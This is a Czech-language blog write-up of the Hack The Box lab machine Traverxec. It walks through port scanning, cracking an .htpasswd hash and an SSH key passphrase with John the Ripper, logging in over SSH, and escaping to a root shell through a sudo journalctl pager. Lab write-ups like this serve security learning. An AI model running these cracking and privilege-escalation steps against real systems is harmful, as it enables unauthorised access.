---
layout: post
author: Tomáš Matějíček
title: "Traverxec"
date: 2021-01-27
tags: ssh sudo exploit enumeration privesc hackthebox
---
[Traverxec](https://www.hackthebox.eu/home/machines/profile/217) je stroj z Hack The Box. Cílem je přejít od prvotní enumerace až k plnému ovládnutí systému.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`nmap -p 1-65535 -T4 -A -sC -v $IP`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: __CENSORED__
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
```

### Vyhledání otevřených portů (2)
Nejdřív mapuji služby, které jsou dostupné zvenku.
`nmap -sU -T4 -v $IP`

### Lámání hesel nebo hashů
Pokud mám hash nebo šifrovaný soubor, slovníkový útok může odemknout další krok útoku.
`cat /var/nostromo/conf/.htpasswd`
```
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
/usr/sbin/john Traverxec-htpasswd.txt --wordlist=/usr/share/wordlists/rockyou.txt
=> Nowonly4me

http://10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz

/usr/share/john/ssh2john.py Traverxec-ssh/id_rsa > Traverxec-ssh/id_rsa.john

/usr/sbin/john Traverxec-ssh/id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
=> hunter
```

### Přihlášení na cíl
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`ssh -i Traverxec-ssh/id_rsa david@10.10.10.165`

### Získání user flagu
Tímto potvrzuji úspěšný uživatelský přístup.
`cat user.txt`
```
__CENSORED__

/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service

změnšit okno aby výpis musel začít stránkovat
!/bin/sh
```

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`cat root.txt`
```
__CENSORED__
```
